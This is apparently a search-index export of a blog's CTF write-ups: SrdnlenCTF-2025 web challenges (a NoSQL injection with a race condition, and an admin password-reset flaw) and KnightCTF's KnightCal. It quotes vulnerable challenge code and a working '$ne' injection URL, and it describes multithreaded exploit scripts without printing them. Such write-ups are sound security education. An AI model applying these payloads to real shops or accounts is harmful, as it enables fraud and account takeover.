      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:2:0",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Provided Files Files: \u00a0Attached Files \ud83d\udd0d Initial Analysis ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:2:1",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "First Steps Initially, the website appears as follows: Site Presentation Home Page we notice by going to the Official Store that it is an online store. Official Store So, most likely, the intent of this challenge will be to purchase the flag. In fact, by opening the attached files, specifically app.js, we can notice these lines of code in the population of the database products: const products = [ { productId: 1, Name: \"Lightning McQueen Toy\", Description: \"Ka-chow! This toy goes as fast as Lightning himself.\", Cost: \"Free\" }, { productId: 2, Name: \"Mater's Tow Hook\", Description: \"Need a tow? Mater's here to save the day (with a little dirt on the side).\", Cost: \"1 Point\" }, { productId: 3, Name: \"Doc Hudson's Racing Tires\", Description: \"They're not just any tires, they're Doc Hudson's tires. Vintage!\", Cost: \"2 Points\" }, { productId: 4, Name: \"Lightning McQueen's Secret Text\", Description: \"Unlock Lightning's secret racing message! Only the fastest get to know the hidden code.\", Cost: \"50 Points\", FLAG: process.env.FLAG || 'SRDNLEN{fake_flag}' } ]; As we can see, in productId: 4 (the last and most expensive one, the flag is contained). Now we just need to figure out how to accumulate points. By continuing to analyze the attached files, we\u2019ll realize that MongoDB is being used, and in app.py we will find a function that generates discount codes. const createDiscountCodes = async () => { const discountCodes = [ { discountCode: generateDiscountCode(), value: 20 } ]; for (const code of discountCodes) { const existingCode = await DiscountCodes.findOne({ discountCode: code.discountCode }); if (!existingCode) { await DiscountCodes.create(code); console.log(`Inserted discount code: ${code.discountCode}`); } else { console.log(`Discount code ${code.discountCode} already exists.`); } } }; This function generates 10 random discount codes for the purchase, which will be used to acquire points that can then be spent on purchasing items, via the /redeem route specified in the routes.py file. Here, there is a vulnerable part of the code, as it accepts a parameter discountCode, which can be used to redeem a valid code and acquire points. The vulnerability is found exactly in this portion of the code: const { discountCode } = req.query; if (!discountCode) { return res.render('error', { Authenticated: true, message: 'Discount code is required!' }); } const discount = await DiscountCodes.findOne({ discountCode }); In fact, since discountCode is a parameter that can be manipulated by the user and is directly used in the query as it is entered by the user, we can send a malicious payload using a NoSQL Injection to find a valid discount code. The query, as it is set, takes the discountCode and checks whether it matches one of those 10 randomly generated discount codes seen earlier. By sending a malicious payload, we can create a condition that returns True, allowing us to redeem a discount code even without knowing it. Later, there is a check where only one discount code can be redeemed per day. So, even if we try to redeem it, we would only get 20 of the 50 points needed. Continuing to read the code, to bypass this check, we can exploit another vulnerability. Usually, when a timeout or delay is applied, it is related to a Race Condition. As we can see in the following lines of code: // Apply the gift card value to the user's balance const { Balance } = await User.findById(req.user.userId).select('Balance'); user.Balance = Balance + discount.value; // Introduce a slight delay to ensure proper logging of the transaction // and prevent potential database write collisions in high-load scenarios. new Promise(resolve => setTimeout(resolve, delay * 1000)); user.lastVoucherRedemption = today; await user.save(); The account balance is extracted, then increased by adding the discount code that we have redeemed. A timeout is applied based on the delay variable declared at the beginning of the file (let delay = 1.5;), which is then multiplied by 1000 (to convert it to milliseconds). This results in a total timeout of 1.5 seconds before the balance update is actually performed in the database. We can exploit this time delay by sending, for example, two more requests in parallel to accumulate 60 points and purchase the flag. This is possible because the subsequent two requests will be sent in less than 1.5 seconds, and therefore, they will pass the checks done previously. These checks are based on the values present in the database, and since those values have not been updated yet due to the timeout, we can redeem multiple codes without being blocked by the restriction that allows redeeming only one code per day. By sending the requests during this window of time, we are able to bypass the restriction and accumulate enough points to purchase the flag. \ud83c\udfaf Solution Path ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:3:0",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Exploitation Steps ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:4:0",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Initial setup After understanding the vulnerabilities we are dealing with, I did a couple of searches on the internet to exploit the NoSQL Injection, as for the Race Condition, it\u2019s enough to create an exploit script in Python with multithreading to send multiple requests concurrently. Through PayloadAllTheThings, I searched for NoSQL payloads https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md. I tried the following payload: http://speed.challs.srdnlen.it:8082/redeem?discountCode[$ne]=test, where $ne stands for not equal. What could happen with this in the following portion of the code, which was also mentioned earlier? const existingCode = await DiscountCodes.findOne({ discountCode: code.discountCode }); As we mentioned, in this case, the above code will create a valid condition, so it\u2019s as if we\u2019ve found the correct discountCode. If we were to express this in natural language, the action would be find me a discountCode that is not equal to 'test'. As we saw during the generation phase, the discountCodes are totally random and alphanumeric, so it\u2019s impossible for the database to have a discountCode equal to test. Therefore, the condition will return True, allowing us to redeem the code and add 20 points to our balance. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:4:1",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Exploitation The exploitation phase doesn\u2019t stop here. Now that we\u2019ve figured out how to redeem points, we need to understand how to redeem more than 20 points per day, as mentioned earlier. We can use Python's multithreading to take advantage of that one and a half seconds timeout set for making multiple requests. So, I\u2019ll write a script that does this and retrieves the flag, because doing it manually would be impossible. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:4:2",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Flag capture Manual Flag \ud83d\udee0\ufe0f Exploitation Process ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:4:3",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Approach The Python exploit utilizes requests, bs4, and finally, multithreading to leverage the Race Condition. I create a pool of 20 threads that run concurrently after a registration phase and account creation using the Faker library, which generates random fake credentials. Once that\u2019s done, I take advantage of the NoSQL Injection for all the threads by visiting the /redeem?discountCode[$ne]=test route, which will redeem a code and add a total of 20 points to the account balance each time, taking advantage of the one-and-a-half-second timeout. Once all of that is done, I visit the root (/) of the site where the flag is displayed (as shown in the image above), and then I extract it using BeautifulSoup and print it out. \u00a0Exploit \ud83d\udea9 Flag Capture Flag ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:5:0",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Proof of Execution Automated Flag Screenshot of successful exploitation \ud83d\udd27 Tools Used Tool Purpose Python Exploit \ud83d\udca1 Key Learnings ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:6:0",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "New Knowledge I have learned NoSQL Injection operators such as $ne, $lt, and how to exploit them in an unsanitized query. I also learned how to create a race condition with multiple sessions to exploit even the milliseconds of delay. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:7:0",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Time Optimization Whenever a delay or any kind of lag is introduced in the code, always consider the possibility of a Race Condition. Additionally, where there are comments in the code, it\u2019s as if there are hints pointing to where the vulnerability might be located. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:8:0",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous \ud83d\udcda References & Resources ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:9:0",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Learning Resources https://www.invicti.com/learn/nosql-injection/ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md https://www.guidepointsecurity.com/blog/race-conditions-in-modern-web-applications/#:~:text=RACE%20conditions%20occur%20when%20we,RACE%20condition%20may%20be%20present. \ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:15 From start to flag Global Ranking (At the time of flag submission) 26/1577 Challenge ranking Points Earned 500 Team contribution Created: 19-01-2025 \u2022 Last Modified: 19-01-2025 Author: mH4ck3r0n3 \u2022 Team: Team Aetruria ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:10:0",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Ben 10' from SrdnlenCTF - 2025",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": " Challenge Presentation \ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event SrdlenCTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 50 Out of 500 total \u2b50 Difficulty \ud83d\udfe2 Easy Personal Rating: 3/10 \ud83d\udc64 Author gheddus Profile \ud83c\udfae Solves (At the time of flag submission) 354 XX% solve rate \ud83d\udcc5 Date 19-01-2025 SrdlenCTF - 2025 Day X \ud83e\uddbe Solved By mH4ck3r0n3 Team: Team Aetruria ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:0:0",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udcdd Challenge Information Ben Tennyson\u2019s Omnitrix holds a mysterious and powerful form called Materia Grigia \u2014 a creature that only those with the sharpest minds can access. It\u2019s hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what\u2019s truly hidden. Can you outsmart the system and reveal the flag? Website: http://ben10.challs.srdnlen.it:8080 ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:1:0",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:2:0",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Provided Files Files: \u00a0Attached Files \ud83d\udd0d Initial Analysis ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:2:1",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "First Steps Initially, the website appears as follows: Site Presentation Creating an account and logging into the site, it appears as follows: Home Page Trying to access the last image of the site, I receive the following error message: Ben 10 Consequently, I believe privileged access to the page is required. By examining the attached files, I noticed that every time a user was registered, another account was created in the database with admin privileges. The username of this account was formatted as \u201cadmin^username^token\u201d. This can be observed in the following function in the app.py file: @app.route('/register', methods=['GET', 'POST']) def register(): \"\"\"Handle user registration.\"\"\" if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username.startswith('admin') or '^' in username: flash(\"I don't like admins\", \"error\") return render_template('register.html') if not username or not password: flash(\"Both fields are required.\", \"error\") return render_template('register.html') admin_username = f\"admin^{username}^{secrets.token_hex(5)}\" admin_password = secrets.token_hex(8) try: conn = sqlite3.connect(DATABASE) cursor = conn.cursor() cursor.execute(\"INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)\", (username, password, admin_username)) cursor.execute(\"INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)\", (admin_username, admin_password, None)) conn.commit() except sqlite3.IntegrityError: flash(\"Username already exists!\", \"error\") return render_template('register.html') finally: conn.close() flash(\"Registration successful!\", \"success\") return redirect(url_for('login')) return render_template('register.html') Now, all we need is to find the user and exploit the password reset function for the admin user to gain access and extract the flag. I noticed that the admin username is exposed on the homepage after logging in, inside an HTML tag with CSS display:none, making it visible through the page source using ChromeDevTools: <div style=\"display:none;\" id=\"admin_data\">{{ admin_username }}</div> In fact, by viewing the page source, we can retrieve the admin username: Admin Username now we can proceed to the exploit. \ud83c\udfaf Solution Path ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:3:0",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Exploitation Steps ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:4:0",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Initial setup The initial phase involves registering a user account. Afterward, we need to log in and retrieve the username of the admin account that was created alongside the user account. This admin username is displayed on the homepage, as mentioned earlier. Once we have obtained the username, we can move on to the actual exploit. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:4:1",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Exploitation The exploit involves resetting the password of the admin account to gain access. However, on the reset screen, we can only reset the password of the user account because a check is implemented in the reset function to block any user whose username starts with admin. Therefore, we begin the reset process with the normal user account created earlier to generate a valid reset token: Reset Token Once the token is generated, we gain access to the reset page. Here, no checks are applied on the type of account we want to reset; we only need to know the account name we obtained in the initial phase. Therefore, we proceed to reset the password of the admin account associated with our user account: Admin Password Reset Once the reset is completed, we simply need to log in with the admin account whose password we just reset, and visit the route /ben/10, which is the last photo in the list, to obtain the flag. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:4:2",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Flag capture Manual Flag \ud83d\udee0\ufe0f Exploitation Process ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:4:3",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Approach The exploit uses requests and BeautifulSoup for extracting the user, the token, and the flag. It literally performs the step-by-step actions described previously: first, it creates an account using the Faker library to generate fake credentials. Then, it logs in and extracts the admin username associated with the user created earlier. After that, it resets the password for the admin user. Finally, after logging in again and visiting the /ben/10 route, it extracts the flag using BeautifulSoup (bs4) and prints it. \u00a0Exploit \ud83d\udea9 Flag Capture Flag ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:5:0",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Proof of Execution Automated Flag Screenshot of successful exploitation \ud83d\udd27 Tools Used Tool Purpose Python Exploit ChromeDevTools Web Testing \ud83d\udca1 Key Learnings Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous \ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:10 From start to flag Global Ranking (At the time of flag submission) 20/1566 Challenge ranking Points Earned 500 Team contribution Created: 19-01-2025 \u2022 Last Modified: 19-01-2025 Author: mH4ck3r0n3 \u2022 Team: Team Aetruria ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:6:0",
        "tags": [
          "\ud83d\udeab Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'KnightCal' from KnightCTF - 2025",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": " Challenge Presentation \ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event KnightCTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 150 Out of XXXX total \u2b50 Difficulty \ud83d\udfe2 Easy Personal Rating: 1/10 \ud83d\udc64 Author NomanProdhan Profile \ud83c\udfae Solves (At the time of flag submission) 269 XX% solve rate \ud83d\udcc5 Date 20-01-2025 KnightCTF - 2025 Day X \ud83e\uddbe Solved By mH4ck3r0n3 Team: QnQSec ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:0:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udcdd Challenge Information In the realm of ancient codes, only those who enumerate correctly can unveil the hidden flag. Craft your mathematical expressions wisely and uncover the secrets that lie within. Flag Format: KCTF{FLaG_HeRe} ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:1:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:2:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Provided Files Files: None \ud83d\udd0d Initial Analysis ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:2:1",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "First Steps Initially, the website appears as follows: Site Presentation by trying to enter something in the numeric input box and submitting, I get letters in the file name: Submit Try so, I assume it\u2019s about finding the correct combination to print the contents of the file flag.txt. \ud83c\udfaf Solution Path ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:3:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Exploitation Steps ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:4:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Initial setup After understanding how it works, I moved on to the exploit, doing a bit of guessing on the letters to figure out which number corresponded to which letter. ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:4:1",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Exploitation After a couple of attempts, I came up with this: Second Attempt continuing to experiment, I found the correct combination, 7195, which allowed me to read the flag.txt file. ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:4:2",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Flag capture Manual Flag \ud83d\udee0\ufe0f Exploitation Process ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:4:3",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Approach The exploit is very simple: it\u2019s a POST request to the page where I pass the parameter expression=7195, which is the correct combination. Then, I extract the flag from the response text using bs4: \u00a0Exploit \ud83d\udea9 Flag Capture Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:5:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Proof of Execution Automated Flag Screenshot of successful exploitation \ud83d\udd27 Tools Used Tool Purpose Python Exploit \ud83d\udca1 Key Learnings ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:6:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous \ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:04 From start to flag Global Ranking (At the time of flag submission) 9/445 Challenge ranking Points Earned 150 Team contribution Created: 20-01-2025 \u2022 Last Modified: 20-01-2025 Author: mH4ck3r0n3 \u2022 Team: QnQSec ",
